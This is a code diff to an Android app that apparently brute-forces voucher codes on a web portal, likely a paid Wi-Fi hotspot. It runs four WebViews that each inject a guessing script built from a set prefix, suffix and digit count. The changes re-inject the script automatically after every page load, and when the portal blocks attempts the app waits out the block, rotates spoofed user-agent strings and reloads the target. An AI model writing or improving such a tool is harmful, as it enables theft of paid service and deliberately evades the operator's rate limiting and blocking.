@@ -27,6 +27,7 @@ public class MainActivity extends Activity {
     private final Random rand = new Random();
     private long lastAttemptTime = 0;
     private long globalBlockUntil = 0;
+    private boolean[] isRunning = new boolean[]{false, false, false, false};
 
     private final String[] UAS = {
         "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/118.0 Mobile",
@@ -84,6 +85,22 @@ public class MainActivity extends Activity {
             s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
             CookieManager.getInstance().setAcceptThirdPartyCookies(webs[i], true);
             webs[i].addJavascriptInterface(new Bridge(id), "AndroidBridge" + id);
+            
+            webs[i].setWebViewClient(new WebViewClient() {
+                @Override public void onPageFinished(WebView view, String url) {
+                    if (isRunning[id]) {
+                        String p = etPrefix.getText().toString().trim();
+                        String s = etSuffix.getText().toString().trim();
+                        int d = parseInt(etDigits, 7);
+                        int a = parseInt(etAttempts, 1000);
+                        int pz = parseInt(etPause, 500);
+                        String cfg = "window.FINDER_CONFIG={id:" + id + ",prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
+                        view.evaluateJavascript(cfg, null);
+                        view.evaluateJavascript(finderJs, null);
+                        appendLog("[W" + id + "] 🔄 تم إعادة حقن السكربت تلقائياً");
+                    }
+                }
+            });
         }
 
         findViewById(R.id.btnGo).setOnClickListener(v -> {
@@ -143,6 +160,7 @@ public class MainActivity extends Activity {
         if (threads > 4) threads = 4;
 
         appendLog("▶ بدء التخمين على " + threads + " شاشة");
+        for(int j=0; j<4; j++) isRunning[j] = false;
         voucherResult.setVisibility(View.GONE);
         statusText.setText("جاري التخمين...");
 
@@ -210,10 +228,18 @@ public class MainActivity extends Activity {
         }
 
         @JavascriptInterface public void triggerGlobalBlock() {
-            globalBlockUntil = System.currentTimeMillis() + 60000; // حظر لمدة 60 ثانية
+            if (System.currentTimeMillis() < globalBlockUntil) return;
+            globalBlockUntil = System.currentTimeMillis() + 65000;
             runOnUiThread(() -> {
-                appendLog("🛑 تم إيقاف جميع الشاشات لمدة 60 ثانية لحماية الشبكة من التعليق.");
-                statusText.setText("⏳ انتظار 60 ثانية (حظر مؤقت)...");
+                appendLog("🛑 تم إيقاف جميع الشاشات لمدة 65 ثانية لحماية الشبكة...");
+                statusText.setText("⏳ انتظار 65 ثانية (حظر مؤقت)...");
+                uiHandler.postDelayed(() -> {
+                    appendLog("🔄 انتهت مدة الحظر، جاري تجديد الجلسات وإعادة التحميل...");
+                    for (int i = 0; i < 4; i++) {
+                        webs[i].getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
+                        webs[i].loadUrl(targetUrl);
+                    }
+                }, 65000);
             });
         }
 
